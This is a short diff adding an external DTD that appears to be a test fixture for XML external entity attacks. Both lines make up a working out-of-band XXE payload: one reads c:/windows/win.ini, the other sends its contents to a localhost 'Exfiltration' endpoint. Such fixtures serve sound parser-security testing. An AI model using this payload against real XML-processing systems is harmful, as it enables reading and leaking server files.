@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file://c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'https://localhost:44317/Exfiltration/?x=%data;'>">
